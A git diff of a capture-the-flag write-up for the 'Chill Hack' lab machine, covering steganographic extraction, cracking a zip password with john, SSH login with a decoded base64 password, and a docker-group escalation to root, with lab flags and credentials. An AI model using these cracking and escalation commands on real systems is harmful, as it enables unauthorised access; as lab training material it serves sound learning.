@@ -189,6 +189,8 @@ whoami
 whoami
 apaar
 ```
+The user flag is found in /home/apaar/local.txt
+`{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}`
 
 ```
 apaar@ip-10-82-186-223:~$ cat /home/apaar/local.txt
@@ -254,13 +256,86 @@ There are two ports that nmap didn't show us:
 3306 mysql
 9001 http
 ```
-Interestingly, there's a password for the mysql in index.php:
+Let's see what's in /var/www/files directory. It contains files related to the website.
+
+There is one .jpg image file in ./images directory. I'm gonna use steghide to check if there's something inside it.
+
 ```
-apaar@ip-10-82-186-223:/var/www/files$ cat index.php
+apaar@ip-10-80-146-61:/var/www/files/images$ python3 -m http.server 5217
+```
+```
+└─# wget http://10.80.146.61:5217/hacker-with-laptop_23-2147985341.jpg
+```
+```
+└─# steghide --extract -sf hacker-with-laptop_23-2147985341.jpg 
+Enter passphrase: 
+wrote extracted data to "backup.zip".
+```
+No passphrase needed! Just click 'Enter' and it saves `backup.zip`.
+```
+┌──(root㉿kali)-[/home/kali/ctf_chill]
+└─# unzip backup.zip                       
+Archive:  backup.zip
+[backup.zip] source_code.php password: 
+   skipping: source_code.php         incorrect password
+```
+Of course it's encrypted!
+
+John, our beloved password cracker has entered the chat! (Yes, Hashcat will be covered.. eventually, in a different CTF ;)
+```
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt zip.crackme                    
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+pass1word        (backup.zip/source_code.php)     
+1g 0:00:00:00 DONE (2026-01-26 08:20) 50.00g/s 614400p/s 614400c/s 614400C/s total90..hawkeye
+Use the "--show" opt
+```
+In less than a second the password was found.
+
+Unzip the file and enter the password
+```
+└─# unzip backup.zip 
+Archive:  backup.zip
+[backup.zip] source_code.php password: 
+  inflating: source_code.php
+```
+If we `cat` it into the terminal, we can quickly find out there's a login page for user Anurodh, and his password is `IWQwbnRLbjB3bVlwQHNzdzByZA==` (in base64).
+
+Decoding it quickly with base64, it translates to: `!d0ntKn0wmYp@ssw0rd`
+
+Maybe it's the key to his account?
+
+```
+└─# ssh anurodh@10.80.146.61
+anurodh@10.80.146.61's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
 ...
-$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
+anurodh@ip-10-80-146-61:~$ 
 ```
-Next we'll gonna break into mssql server..
+And the next account is breached!
+```
+anurodh@ip-10-80-146-61:~$ id
+uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
+```
+Ahh, so it's a docker container! Does GTFOBins tells us anything about it?
+
+The answer is yes! The last final command is to use:
+```
+anurodh@ip-10-80-146-61:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
+# 
+```
+```
+# whoami
+root
+```
+>Rest in peace, Chill Hack CTF.
+
+Final flag is in /root/proof.txt file: 
+`{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}`
+
+>Pssst! Upcoming writeups will have images! (I did not know you can store them on your github..)
 
 zmienic IP od polowy writeupu bo zmienilem maszyne.
 
